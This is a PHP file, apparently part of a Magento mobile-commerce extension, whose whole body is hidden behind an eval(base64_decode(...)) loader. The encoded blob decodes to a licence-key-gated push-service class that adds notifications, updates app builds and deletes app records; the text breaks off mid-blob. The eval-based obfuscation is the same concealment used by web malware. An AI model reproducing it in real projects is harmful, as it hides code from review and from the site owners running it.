<?php function nVBtBPDGxxpLlgAoaWky($bzvEwMFRoc){$r=base64_decode("YmFzZTY0X2RlY29kZSgkYnp2RXdNRlJvYyk=");return eval("return $r;");} eval('?>'.nVBtBPDGxxpLlgAoaWky('PD9waHANCiRHTE9CQUxTWyJxTW9yZG5lbWFjeUxieGtqTkduYyJdPWJhc2U2NF9kZWNvZGUoIkwzUnBiV05oWTJobCIpOyRHTE9CQUxTWyJGbXNWcHhtanN6WGdSVHJtWm1KciJdPWJhc2U2NF9kZWNvZGUoImRHbHRZMkZqYUdVPSIpOyRHTE9CQUxTWyJaS29tdkh1YU1lQXZVRGltVWpDQyJdPWJhc2U2NF9kZWNvZGUoIkwwMXZZbWxUWlhSMGFXNW5jeTkwYVcxMGFIVnRZaTV3YUhBPSIpOyRHTE9CQUxTWyJ1alpZZU1BSkxUVXVZeEFJd3VjIl09YmFzZTY0X2RlY29kZSgiSlc4PSIpOyRHTE9CQUxTWyJVUXRYenNoYlpoQldWQkpHUllOaSJdPWJhc2U2NF9kZWNvZGUoImRHbHRkR2gxYldJdWNHaHciKTskR0xPQkFMU1siUHByRG9jd3FpT2N1WFdkdlZiTHMiXT1iYXNlNjRfZGVjb2RlKCJjR1Z5YldsemMybHZibk09Iik7JEdMT0JBTFNbIkd4UEpGWURISk50blhJbkpoa1VHIl09YmFzZTY0X2RlY29kZSgiYlc5a2RXeGxjdz09Iik7JEdMT0JBTFNbImxzS2FFdXJDRnZocUlmZVJiRWFwIl09YmFzZTY0X2RlY29kZSgiZVdWeiIpOyRHTE9CQUxTWyJ5amRIaUJQVWtBTnZScFNVbmVXRCJdPWJhc2U2NF9kZWNvZGUoImJXOWtkV3hsVm1WeWMybHZiZz09Iik7JEdMT0JBTFNbIll1QktRVktTbERBYUl4b2VSeXV5Il09YmFzZTY0X2RlY29kZSgiVFc5aWFXTnZiVzFsY21ObFgwMXZZbWx6WlhKMmFXTmxjek09Iik7JEdMT0JBTFNbImdaR3RCb25hbnhNQ0pmZWdtVXZjIl09YmFzZTY0X2RlY29kZSgiWTI5eVpRPT0iKTskR0xPQkFMU1siUGNrWVllaHdlSkZUWUpERFpBbXAiXT1iYXNlNjRfZGVjb2RlKCJiVzlrZFd4bFUzUmhkSFZ6Iik7JEdMT0JBTFNbIlZ0eWFieEJBam9OQVhCakRvcXh5Il09YmFzZTY0X2RlY29kZSgiWkdGMFlRPT0iKTskR0xPQkFMU1sic3ZiVG9LanNEZUJLWEJqaVZkQWsiXT1iYXNlNjRfZGVjb2RlKCJibTg9Iik7JEdMT0JBTFNbIkNHT2FCZnJrRkhsWm1abW5NVEhLIl09YmFzZTY0X2RlY29kZSgiZDJWaVlYQndYM1Z5YkE9PSIpOyRHTE9CQUxTWyJsUkJ6dnpCU0VRa0p4ZEJJdGJnIl09YmFzZTY0X2RlY29kZSgiTEE9PSIpOyRHTE9CQUxTWyJIdUVMWGRCSnNVQWNoSXhhYlBVIl09YmFzZTY0X2RlY29kZSgiWVhCd1gyeHBZMlZ1YzJWZmEyVjUiKTskR0xPQkFMU1siaW94b0xmcmZ6ZGlnc25nTERtbCJdPWJhc2U2NF9kZWNvZGUoImMyVnlkbWxqWlhOZmNIVnlZMmhoYzJWayIpOyRHTE9CQUxTWyJrcFFpWXpKY0JSc0xjU2psU0xsTSJdPWJhc2U2NF9kZWNvZGUoImJXOWlhV052YlcxbGNtTmxYMjl5WkdWeWFXUT0iKTskR0xPQkFMU1siT1hEQ1lZVG10SFpoR09HaWFHYkkiXT1iYXNlNjRfZGVjb2RlKCJiVzlrWlE9PSIpOyRHTE9CQUxTWyJLaURoZ3Z0b2Ruend5Tkh1c01nUSJdPWJhc2U2NF9kZWNvZGUoIllYQndjM1J2WkdWc1pYUmwiKTskR0xPQkFMU1siWFVLcnZoVkRCRUtBWHZyaENJZmwiXT1iYXNlNjRfZGVjb2RlKCJZV1JrYjI1ZmNHRnlZVzFsZEdWeWN3PT0iKTskR0xPQkFMU1siR0VHaGhJb1RTaGJRTU5PeVlESmwiXT1iYXNlNjRfZGVjb2RlKCJaR1ZzYVhabGNubGZjM1JoZEhWeiIpOyRHTE9CQUxTWyJxUm5icHhFaGJFSVZkZUNzUG96YSJdPWJhc2U2NF9kZWNvZGUoImFXOXpYM1Z5YkE9PSIpOyRHTE9CQUxTWyJ2bGdheWRSVkpzclp1Z1BNcnNETCJdPWJhc2U2NF9kZWNvZGUoImFXOXpYM04wWVhSMWN3PT0iKTskR0xPQkFMU1siak5tZWlxSWZLVVNZZ0JiaU1rSSJdPWJhc2U2NF9kZWNvZGUoImRXUnBaQT09Iik7JEdMT0JBTFNbIlN0cVZPalBQc2x5dE5SeGFodnF1Il09YmFzZTY0X2RlY29kZSgiWVc1a2NtOXBaRjkxY213PSIpOyRHTE9CQUxTWyJUdmhBd1h0SXdyWWRwVGFKYW91Il09YmFzZTY0X2RlY29kZSgiWVc1a2NtOXBaRjl6ZEdGMGRYTT0iKTskR0xPQkFMU1siVXVpSHpxWXFUTWhzc0lKbUZucyJdPWJhc2U2NF9kZWNvZGUoIllYQndYMjF2WkdVPSIpOyRHTE9CQUxTWyJhV3ZDZ3pLdVhyaGt6SkRYQkl4WSJdPWJhc2U2NF9kZWNvZGUoIllYQndYMjVoYldVPSIpOyRHTE9CQUxTWyJqdlhCR0dvRHZmbHF2V2tidWpLUCJdPWJhc2U2NF9kZWNvZGUoIllYQndYMnRsZVE9PSIpOyRHTE9CQUxTWyJwQWtKSmplUmtiWU9kQmtuT09rdCJdPWJhc2U2NF9kZWNvZGUoIllYQndYMk52WkdVPSIpOyRHTE9CQUxTWyJNSVNzdGpqWHR1RnJRd0NrU1prTyJdPWJhc2U2NF9kZWNvZGUoImJXOWlhV0ZrYldsdU15OWhjSEJzYVdOaGRHbHZibk09Iik7JEdMT0JBTFNbIlBuUkZnZGFMZ1FibHBqc29pYUhPIl09YmFzZTY0X2RlY29kZSgiWVhCd2EyVjUiKTskR0xPQkFMU1siWndLUkl4V0RHUHpqSUVSY1ROVWgiXT1iYXNlNjRfZGVjb2RlKCJZWEJ3WTI5a1pRPT0iKTskR0xPQkFMU1siSmROWXZBWUVGS2JPSHFmakVwZVEiXT1iYXNlNjRfZGVjb2RlKCJiVzlpYVdGa2JXbHVNeTl1YjNScFptbGpZWFJwYjI0PSIpOyRHTE9CQUxTWyJndk9UQ3phUHNFd0VPa05uR0JRRyJdPWJhc2U2NF9kZWNvZGUoImJHbGpaVzVqWlY5clpYaz0iKTskR0xPQkFMU1sibGZad2hDb1ZSaVlodlZQQlFiRWUiXT1iYXNlNjRfZGVjb2RlKCJiV1Z6YzJGblpRPT0iKTskR0xPQkFMU1sia3Fwam9raW5yTkt6TWxtZWNyQnMiXT1iYXNlNjRfZGVjb2RlKCJkSGx3WlE9PSIpOyRHTE9CQUxTWyJ1Y2F3ZVFOSXFLaGFVT2tzdEhqcyJdPWJhc2U2NF9kZWNvZGUoImIyOXdjdz09Iik7JEdMT0JBTFNbIkVSbEdpWm15aURHYm5Rb2N0YVEiXT1iYXNlNjRfZGVjb2RlKCJUbThnWVhCd2N5Qm1iM1Z1WkE9PSIpOyRHTE9CQUxTWyJQS1h6b3FvZWNQaklUa0dyZEFFeCJdPWJhc2U2NF9kZWNvZGUoImJXeGZaR1ZpZFdkblpYSmZiVzlrWlE9PSIpOyRHTE9CQUxTWyJKS0JrbkFEZ2xZT0luQktoU255RyJdPWJhc2U2NF9kZWNvZGUoImJXOWlhV0ZrYldsdU15OXNhV05sYm1ObCIpOyRHTE9CQUxTWyJGbklNWGNPUnZYT21aTnFKSFdHRSJdPWJhc2U2NF9kZWNvZGUoImRYQmtZWFJsWDNScGJXVT0iKTskR0xPQkFMU1sid3ZNcWlnUk96elJMYWpMVHl4cyJdPWJhc2U2NF9kZWNvZGUoImMyVnlkbWxqWlhOZmNIVnlZMmhoYzJWayIpOyRHTE9CQUxTWyJ3b3hqb2Zib214UVl3R1d5VmZieiJdPWJhc2U2NF9kZWNvZGUoImJXOWlhV052YlcxbGNtTmxYMjl5WkdWeWFXUT0iKTskR0xPQkFMU1siQXVYbmtPZVFmZ0ZTT2ZTZFVIRXMiXT1iYXNlNjRfZGVjb2RlKCJZV1JrYjI1ZmNHRnlZVzFsZEdWeWN3PT0iKTskR0xPQkFMU1siT1VqWFFmYkhHV3pTc0tmeFVRZyJdPWJhc2U2NF9kZWNvZGUoIlpHVnNhWFpsY25sZmMzUmhkSFZ6Iik7JEdMT0JBTFNbIktiaHFlS3FCQmpjZFdZVVN1Tkl2Il09YmFzZTY0X2RlY29kZSgiYVc5elgzTjBZWFIxY3c9PSIpOyRHTE9CQUxTWyJZRGlRZUFoak5qVGZSV2ZJaldSUCJdPWJhc2U2NF9kZWNvZGUoImFXOXpYM1Z5YkE9PSIpOyRHTE9CQUxTWyJLT0lkZnRNeW96RlZGeHdoaFV4YSJdPWJhc2U2NF9kZWNvZGUoIllXNWtjbTlwWkY5emRHRjBkWE09Iik7JEdMT0JBTFNbInBya0dsR1p5dU1qYkZoeVpzbyJdPWJhc2U2NF9kZWNvZGUoIllXNWtjbTlwWkY5MWNtdz0iKTskR0xPQkFMU1siRkJpYVR6ekZmc0V0Q2hpQnBYQmgiXT1iYXNlNjRfZGVjb2RlKCJZWEJ3WDIxdlpHVT0iKTskR0xPQkFMU1siU2Jjek9WVEZ4aEJpZW1ueVVXclkiXT1iYXNlNjRfZGVjb2RlKCJTVzUyWVd4cFpDQndZWEpoYldWMFpYSnoiKTskR0xPQkFMU1siZUJlbkhGbnJWcXNOTHVaYUJKS3EiXT1iYXNlNjRfZGVjb2RlKCJUbThnY21WamIzSmtjeUJtYjNWdVpBPT0iKTskR0xPQkFMU1sic0xmY2p2SlhiZ01UZUt3YUxDdVUiXT1iYXNlNjRfZGVjb2RlKCJJRUZ3Y0hNZ1pHVnNaWFJsWkE9PSIpOyRHTE9CQUxTWyJ0Z2RIaEV5b2pSSG5KbXRXdHluUSJdPWJhc2U2NF9kZWNvZGUoIklHRndjSE1nZFhCa1lYUmxaQT09Iik7JEdMT0JBTFNbIlh0U01xTFZuV0dsa2RoS1dpaW9qIl09YmFzZTY0X2RlY29kZSgiU1c1MllXeHBaQ0JzYVdObGJtTmxJR3RsZVE9PSIpOyRHTE9CQUxTWyJyZG1zb2xnZUpqQ3JVSFRnckpRViJdPWJhc2U2NF9kZWNvZGUoIlRtOTBhV1pwWTJGMGFXOXVJR0ZrWkdWayIpOyRHTE9CQUxTWyJlWnJLemZVZ0J4c2FJQUhWTlh3cyJdPWJhc2U2NF9kZWNvZGUoIk1BPT0iKTskR0xPQkFMU1siZlhZZGRaR25LZEJBalJXVEpjY0oiXT1iYXNlNjRfZGVjb2RlKCJjbVZoWkY5emRHRjBkWE09Iik7JEdMT0JBTFNbIk9mSkFWbnRHRHdRbG53WERSUXlpIl09YmFzZTY0X2RlY29kZSgiYldWemMyRm5aUT09Iik7JEdMT0JBTFNbInJjckpLTFNGclNSdEdubnVmUk9JIl09YmFzZTY0X2RlY29kZSgiV1MxdExXUWdTRHBwT25NPSIpOyRHTE9CQUxTWyJiekZIcUFreWpPSEZRTmRTRUFyRSJdPWJhc2U2NF9kZWNvZGUoIlpHRjBaVjloWkdSbFpBPT0iKTskR0xPQkFMU1sicmpycFhnRGl1WURqRm5XYkJBbUciXT1iYXNlNjRfZGVjb2RlKCJkSGx3WlE9PSIpOyRHTE9CQUxTWyJadFZIclVHQmdpZURLZWdxeURYciJdPWJhc2U2NF9kZWNvZGUoImFXNTJZV3hwWkY5a1lYUmgiKTsNCj8+PD9waHANCmNsYXNzIE1vYmljb21tZXJjZV9Nb2Jpc2VydmljZXMzX01vZGVsX1B1c2hzZXJ2aWNlIGV4dGVuZHMgTW9iaWNvbW1lcmNlX01vYmlzZXJ2aWNlczNfTW9kZWxfQWJzdHJhY3Qgew0KDQogICAgcHVibGljIGZ1bmN0aW9uIGFkZE5vdGlmaWNhdGlvbigkZGF0YSA9IGFycmF5KCkpDQogICAgew0KICAgICAgICAkdHlwZSA9IGlzc2V0KCRkYXRhWyRHTE9CQUxTWyJrcXBqb2tpbnJOS3pNbG1lY3JCcyJdXSkgPyAkZGF0YVskR0xPQkFMU1sia3Fwam9raW5yTkt6TWxtZWNyQnMiXV0gOiBOVUxMOw0KICAgICAgICAkbWVzc2FnZSA9IGlzc2V0KCRkYXRhWyRHTE9CQUxTWyJsZlp3aENvVlJpWWh2VlBCUWJFZSJdXSkgPyAkZGF0YVskR0xPQkFMU1sibGZad2hDb1ZSaVlodlZQQlFiRWUiXV0gOiBOVUxMOw0KICAgICAgICAkY0lneU9ZbFNtZnpnVXRKWkVla1IgPSBpc3NldCgkZGF0YVskR0xPQkFMU1siZ3ZPVEN6YVBzRXdFT2tObkdCUUciXV0pID8gJGRhdGFbJEdMT0JBTFNbImd2T1RDemFQc0V3RU9rTm5HQlFHIl1dIDogTlVMTDsNCg0KICAgICAgICBpZihlbXB0eSgkdHlwZSkgfHwgZW1wdHkoJG1lc3NhZ2UpIHx8IGVtcHR5KCRjSWd5T1lsU21memdVdEpaRWVrUikpew0KICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5lcnJvclN0YXR1cygkR0xPQkFMU1siWnRWSHJVR0JnaWVES2VncXlEWHIiXSk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZXsNCiAgICAgICAgICAgIGlmKCR0aGlzLT5fdmFsaWRhdGVMaWNlbmNlS2V5KCRjSWd5T1lsU21memdVdEpaRWVrUikpew0KICAgICAgICAgICAgICAgIE1hZ2U6OmdldE1vZGVsKCRHTE9CQUxTWyJKZE5ZdkFZRUZLYk9IcWZqRXBlUSJdKS0+c2V0RGF0YShhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgJEdMT0JBTFNbInJqcnBYZ0RpdVlEakZuV2JCQW1HIl0gICAgICAgID0+ICR0eXBlLA0KICAgICAgICAgICAgICAgICAgICAkR0xPQkFMU1siYnpGSHFBa3lqT0hGUU5kU0VBckUiXSAgPT4gZGF0ZSgkR0xPQkFMU1sicmNySktMU0ZyU1J0R25udWZST0kiXSksDQogICAgICAgICAgICAgICAgICAgICRHTE9CQUxTWyJPZkpBVm50R0R3UWxud1hEUlF5aSJdICAgICA9PiAkbWVzc2FnZSwNCiAgICAgICAgICAgICAgICAgICAgJEdMT0JBTFNbImZYWWRkWkduS2RCQWpSV1RKY2NKIl0gPT4gJEdMT0JBTFNbImVackt6ZlVnQnhzYUlBSFZOWHdzIl0NCiAgICAgICAgICAgICAgICAgICAgKSktPnNhdmUoKTsNCg0KICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c3VjY2Vzc1N0YXR1cygkR0xPQkFMU1sicmRtc29sZ2VKakNyVUhUZ3JKUVYiXSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlew0KICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+ZXJyb3JTdGF0dXMoJEdMT0JBTFNbIlh0U01xTFZuV0dsa2RoS1dpaW9qIl0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgcHVibGljIGZ1bmN0aW9uIHVwZGF0ZUJ1aWxkKCRkYXRhID0gYXJyYXkoKSkNCiAgICB7DQogICAgICAgICR1cmtWUElWb2hYUVVSSHdUQ1JicyA9IGlzc2V0KCRkYXRhWyRHTE9CQUxTWyJad0tSSXhXREdQempJRVJjVE5VaCJdXSkgPyAkZGF0YVskR0xPQkFMU1siWndLUkl4V0RHUHpqSUVSY1ROVWgiXV0gOiBOVUxMOw0KICAgICAgICAkU1VrRlBjYWduTUJWYndVbWRyYXEgID0gaXNzZXQoJGRhdGFbJEdMT0JBTFNbIlBuUkZnZGFMZ1FibHBqc29pYUhPIl1dKSA/ICRkYXRhWyRHTE9CQUxTWyJQblJGZ2RhTGdRYmxwanNvaWFITyJdXSA6IE5VTEw7DQogICAgICAgICRjSWd5T1lsU21memdVdEpaRWVrUiA9IGlzc2V0KCRkYXRhWyRHTE9CQUxTWyJndk9UQ3phUHNFd0VPa05uR0JRRyJdXSkgPyAkZGF0YVskR0xPQkFMU1siZ3ZPVEN6YVBzRXdFT2tObkdCUUciXV0gOiBOVUxMOw0KICAgICAgICBpZighZW1wdHkoJHVya1ZQSVZvaFhRVVJId1RDUmJzKSAmJiAhZW1wdHkoJFNVa0ZQY2Fnbk1CVmJ3VW1kcmFxKSAmJiAhZW1wdHkoJGNJZ3lPWWxTbWZ6Z1V0SlpFZWtSKSl7DQogICAgICAgICAgICBpZigkdGhpcy0+X3ZhbGlkYXRlTGljZW5jZUtleSgkY0lneU9ZbFNtZnpnVXRKWkVla1IpKXsNCiAgICAgICAgICAgICAgICAkY29sbGVjdGlvbiA9IE1hZ2U6OmdldE1vZGVsKCRHTE9CQUxTWyJNSVNzdGpqWHR1RnJRd0NrU1prTyJdKS0+Z2V0Q29sbGVjdGlvbigpDQogICAgICAgICAgICAgICAgICAgIC0+YWRkRmllbGRUb0ZpbHRlcigkR0xPQkFMU1sicEFrSkpqZVJrYllPZEJrbk9Pa3QiXSwkdXJrVlBJVm9oWFFVUkh3VENSYnMpDQogICAgICAgICAgICAgICAgICAgIC0+YWRkRmllbGRUb0ZpbHRlcigkR0xPQkFMU1sianZYQkdHb0R2ZmxxdldrYnVqS1AiXSwkU1VrRlBjYWduTUJWYndVbWRyYXEpOw0KICAgICAgICAgICAgICAgIGlmKCRjb2xsZWN0aW9uKXsNCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCgkY29sbGVjdGlvbiBhcyAkX2NvbGxlY3Rpb24pew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNzZXQoJGRhdGFbJEdMT0JBTFNbImFXdkNnekt1WHJoa3pKRFhCSXhZIl1dKSl7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJF9jb2xsZWN0aW9uLT5zZXREYXRhKCRHTE9CQUxTWyJhV3ZDZ3pLdVhyaGt6SkRYQkl4WSJdLCAkZGF0YVskR0xPQkFMU1siYVd2Q2d6S3VYcmhrekpEWEJJeFkiXV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNzZXQoJGRhdGFbJEdMT0JBTFNbIlV1aUh6cVlxVE1oc3NJSm1GbnMiXV0pKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkX2NvbGxlY3Rpb24tPnNldERhdGEoJEdMT0JBTFNbIlV1aUh6cVlxVE1oc3NJSm1GbnMiXSwgJGRhdGFbJEdMT0JBTFNbIlV1aUh6cVlxVE1oc3NJSm1GbnMiXV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNzZXQoJGRhdGFbJEdMT0JBTFNbIlR2aEF3WHRJd3JZZHBUYUphb3UiXV0pKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkX2NvbGxlY3Rpb24tPnNldERhdGEoJEdMT0JBTFNbIlR2aEF3WHRJd3JZZHBUYUphb3UiXSwgJGRhdGFbJEdMT0JBTFNbIlR2aEF3WHRJd3JZZHBUYUphb3UiXV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNzZXQoJGRhdGFbJEdMT0JBTFNbIlN0cVZPalBQc2x5dE5SeGFodnF1Il1dKSl7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJF9jb2xsZWN0aW9uLT5zZXREYXRhKCRHTE9CQUxTWyJTdHFWT2pQUHNseXROUnhhaHZxdSJdLCAkZGF0YVskR0xPQkFMU1siU3RxVk9qUFBzbHl0TlJ4YWh2cXUiXV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNzZXQoJGRhdGFbJEdMT0JBTFNbImpObWVpcUlmS1VTWWdCYmlNa0kiXV0pKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkX2NvbGxlY3Rpb24tPnNldERhdGEoJEdMT0JBTFNbImpObWVpcUlmS1VTWWdCYmlNa0kiXSwgJGRhdGFbJEdMT0JBTFNbImpObWVpcUlmS1VTWWdCYmlNa0kiXV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNzZXQoJGRhdGFbJEdMT0JBTFNbInZsZ2F5ZFJWSnNyWnVnUE1yc0RMIl1dKSl7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJF9jb2xsZWN0aW9uLT5zZXREYXRhKCRHTE9CQUxTWyJ2bGdheWRSVkpzclp1Z1BNcnNETCJdLCAkZGF0YVskR0xPQkFMU1sidmxnYXlkUlZKc3JadWdQTXJzREwiXV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNzZXQoJGRhdGFbJEdMT0JBTFNbInFSbmJweEVoYkVJVmRlQ3NQb3phIl1dKSl7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJF9jb2xsZWN0aW9uLT5zZXREYXRhKCRHTE9CQUxTWyJxUm5icHhFaGJFSVZkZUNzUG96YSJdLCAkZGF0YVskR0xPQkFMU1sicVJuYnB4RWhiRUlWZGVDc1BvemEiXV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNzZXQoJGRhdGFbJEdMT0JBTFNbIkdFR2hoSW9UU2hiUU1OT3lZREpsIl1dKSl7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJF9jb2xsZWN0aW9uLT5zZXREYXRhKCRHTE9CQUxTWyJHRUdoaElvVFNoYlFNTk95WURKbCJdLCAkZGF0YVskR0xPQkFMU1siR0VHaGhJb1RTaGJRTU5PeVlESmwiXV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNzZXQoJGRhdGFbJEdMT0JBTFNbIlhVS3J2aFZEQkVLQVh2cmhDSWZsIl1dKSl7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJF9jb2xsZWN0aW9uLT5zZXREYXRhKCRHTE9CQUxTWyJYVUtydmhWREJFS0FYdnJoQ0lmbCJdLCAkZGF0YVskR0xPQkFMU1siWFVLcnZoVkRCRUtBWHZyaENJZmwiXV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAkX2NvbGxlY3Rpb24tPnNhdmUoKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnN1Y2Nlc3NTdGF0dXMoJGNvbGxlY3Rpb24tPmNvdW50KCkgLiAkR0xPQkFMU1sidGdkSGhFeW9qUkhuSm10V3R5blEiXSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlew0KICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+ZXJyb3JTdGF0dXMoJEdMT0JBTFNbIlh0U01xTFZuV0dsa2RoS1dpaW9qIl0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgcHVibGljIGZ1bmN0aW9uIHJlbW92ZWFwcHMoJGRhdGEgPSBhcnJheSgpKQ0KICAgIHsNCiAgICAgICAgJGNJZ3lPWWxTbWZ6Z1V0SlpFZWtSID0gaXNzZXQoJGRhdGFbJEdMT0JBTFNbImd2T1RDemFQc0V3RU9rTm5HQlFHIl1dKSA/ICRkYXRhWyRHTE9CQUxTWyJndk9UQ3phUHNFd0VPa05uR0JRRyJdXSA6IE5VTEw7DQogICAgICAgIGlmKCRjSWd5T1lsU21memdVdEpaRWVrUiAmJiBpc3NldCgkZGF0YVskR0xPQkFMU1siS2lEaGd2dG9kbnp3eU5IdXNNZ1EiXV0pICYmICFlbXB0eSgkZGF0YVskR0xPQkFMU1siS2lEaGd2dG9kbnp3eU5IdXNNZ1EiXV0pKXsNCiAgICAgICAgICAgIGlmKCR0aGlzLT5fdmFsaWRhdGVMaWNlbmNlS2V5KCRjSWd5T1lsU21memdVdEpaRWVrUikpew0KICAgICAgICAgICAgICAgICRTTnpDTWFSSG5tdXZveUZobVZiUCA9IGFycmF5KCk7DQogICAgICAgICAgICAgICAgZm9yZWFjaCgkZGF0YVsnYXBwc3RvZGVsZXRlJ10gYXMgJF9hcHApew0KICAgICAgICAgICAgICAgICAgICAkU056Q01hUkhubXV2b3lGaG1WYlBbXSA9ICRfYXBwWyRHTE9CQUxTWyJad0tSSXhXREdQempJRVJjVE5VaCJdXTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJExxdXZoTHZIeUNPV3lRU0xjV3V1ID0gTWFnZTo6Z2V0TW9kZWwoJEdMT0JBTFNbIk1JU3N0ampYdHVGclF3Q2tTWmtPIl0pLT5kZWxldGVhcHBzKCRTTnpDTWFSSG5tdXZveUZobVZiUCk7DQogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zdWNjZXNzU3RhdHVzKCRMcXV2aEx2SHlDT1d5UVNMY1d1dSAuICRHTE9CQUxTWyJzTGZjanZKWGJnTVRlS3dhTEN1VSJdKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJHRoaXMtPmVycm9yU3RhdHVzKCRHTE9CQUxTWyJlQmVuSEZuclZxc05MdVphQkpLcSJdKTsNCiAgICB9DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gYnV5YXBwKCRkYXRhID0gYXJyYXkoKSkNCiAgICB7DQogICAgICAgICR1cmtWUElWb2hYUVVSSHdUQ1JicyAgICAgICAgICAgICAgPSBpc3NldCgkZGF0YVskR0xPQkFMU1siWndLUkl4V0RHUHpqSUVSY1ROVWgiXV0pID8gJGRhdGFbJEdMT0JBTFNbIlp3S1JJeFdER1B6aklFUmNUTlVoIl1dIDogTlVMTDsNCiAgICAgICAgJFNVa0ZQY2Fnbk1CVmJ3VW1kcmFxICAgICAgICAgICAgICAgPSBpc3NldCgkZGF0YVskR0xPQkFMU1siUG5SRmdkYUxnUWJscGpzb2lhSE8iXV0pID8gJGRhdGFbJEdMT0JBTFNbIlBuUkZnZGFMZ1FibHBqc29pYUhPIl1dIDogTlVMTDsNCiAgICAgICAgJGNJZ3lPWWxTbWZ6Z1V0SlpFZWtSICAgICAgICAgID0gaXNzZXQoJGRhdGFbJEdMT0JBTFNbImd2T1RDemFQc0V3RU9rTm5HQlFHIl1dKSA/ICRkYXRhWyRHTE9CQUxTWyJndk9UQ3phUHNFd0VPa05uR0JRRyJdXSA6IE5VTEw7DQogICAgICAgICRtb2RlICAgICAgICAgICAgICAgICA9IGlzc2V0KCRkYXRhWyRHTE9CQUxTWyJPWERDWVlUbXRIWmhHT0dpYUdiSSJdXSkgPyAkZGF0YVskR0xPQkFMU1siT1hEQ1lZVG10SFpoR09HaWFHYkkiXV0gOiBOVUxMOw0KICAgICAgICAkVGdkWnZLUnRWa3ZKZFpKaHpUQyA9IGlzc2V0KCRkYXRhWyRHTE9CQUxTWyJrcFFpWXpKY0JSc0xjU2psU0xsTSJdXSkgPyAkZGF0YVskR0xPQkFMU1sia3BRaVl6SmNCUnNMY1NqbFNMbE0iXV0gOiBOVUxMOw0KICAgICAgICAkZnhHWVRzVkpTQm1Fb3V0TnVqWWsgICA9IGlzc2V0KCRkYXRhWyRHTE9CQUxTWyJpb3hvTGZyZnpkaWdzbmdMRG1sIl1dKSA/ICRkYXRhWyRHTE9CQUxTWyJpb3hvTGZyZnpkaWdzbmdMRG1sIl1dIDogTlVMTDsNCg0KICAgICAgICBpZihlbXB0eSgkdXJrVlBJVm9oWFFVUkh3VENSYnMpIHx8IGVtcHR5KCRTVWtGUGNhZ25NQlZid1VtZHJhcSkgfHwgZW1wdHkoJGNJZ3lPWWxTbWZ6Z1V0SlpFZWtSKSB8fCBlbXB0eSgkbW9kZSkgfHwgZW1wdHkoJFRnZFp2S1J0Vmt2SmRaSmh6VEMpKXsNCiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+ZXJyb3JTdGF0dXMoJEdMT0JBTFNbIlNiY3pPVlRGeGhCaWVtbnlVV3JZIl0pOw0KICAgICAgICB9DQogICAgICAgIGVsc2V7DQogICAgICAgICAgICAkWHlnbkZHd0xsamxnVGtteHVhblogPSBNYWdlOjpnZXRNb2RlbCgkR0xPQkFMU1siTUlTc3Rqalh0dUZyUXdDa1Naa08iXSktPmdldENvbGxlY3Rpb24oKQ0KICAgICAgICAgICAgICAgIC0+YWRkRmllbGRUb0ZpbHRlcigkR0xPQkFMU1sicEFrSkpqZVJrYllPZEJrbk9Pa3QiXSwgJHVya1ZQSVZvaFhRVVJId1RDUmJzKQ0KICAgICAgICAgICAgICAgIC0+YWRkRmllbGRUb0ZpbHRlcigkR0xPQkFMU1sianZYQkdHb0R2ZmxxdldrYnVqS1AiXSwgJFNVa0ZQY2Fnbk1CVmJ3VW1kcmFxKQ0KICAgICAgICAgICAgICAgIC0+YWRkRmllbGRUb0ZpbHRlcigkR0xPQkFMU1siSHVFTFhkQkpzVUFjaEl4YWJQVSJdLCAkY0lneU9ZbFNtZnpnVXRKWkVla1IpOw0KDQogICAgICAgICAgICAkZnhHWVRzVkpTQm1Fb3V0TnVqWWsgPSBleHBsb2RlKCRHTE9CQUxTWyJsUkJ6dnpCU0VRa0p4ZEJJdGJnIl0sICRmeEdZVHNWSlNCbUVvdXROdWpZayk7DQoNCiAgICAgI